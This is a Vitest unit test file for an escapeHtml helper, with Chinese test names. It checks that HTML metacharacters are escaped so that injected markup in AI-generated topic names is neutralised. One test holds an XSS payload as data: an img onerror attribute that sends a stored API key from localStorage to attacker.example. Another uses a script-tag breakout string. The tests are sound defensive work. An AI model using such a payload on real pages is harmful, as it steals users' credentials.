import { describe, expect, it } from 'vitest';
import { escapeHtml } from './html';

describe('escapeHtml（F5）', () => {
  it('转义 HTML 元字符', () => {
    expect(escapeHtml('<&>"\'')).toBe('&lt;&amp;&gt;&quot;&#39;');
  });

  it('中和 AI 主题名中的 img onerror 注入', () => {
    const attack =
      '<img src=x onerror="fetch(\'https://attacker.example/?k=\'+localStorage.getItem(\'greview.apiKey\'))">';
    const escaped = escapeHtml(attack);
    expect(escaped).not.toContain('<');
    expect(escaped).not.toContain('>');
    expect(escaped).not.toContain('"');
    expect(escaped).toContain('&lt;img');
    expect(escaped).toContain('onerror=&quot;');
  });

  it('转义 script/style 闭合序列，避免逃出 tooltip 容器', () => {
    expect(escapeHtml('</div><script>alert(1)</script>')).toBe(
      '&lt;/div&gt;&lt;script&gt;alert(1)&lt;/script&gt;',
    );
  });

  it('数字、null 与 undefined 安全转换为文本', () => {
    expect(escapeHtml(42)).toBe('42');
    expect(escapeHtml(0)).toBe('0');
    expect(escapeHtml(null)).toBe('');
    expect(escapeHtml(undefined)).toBe('');
  });
});
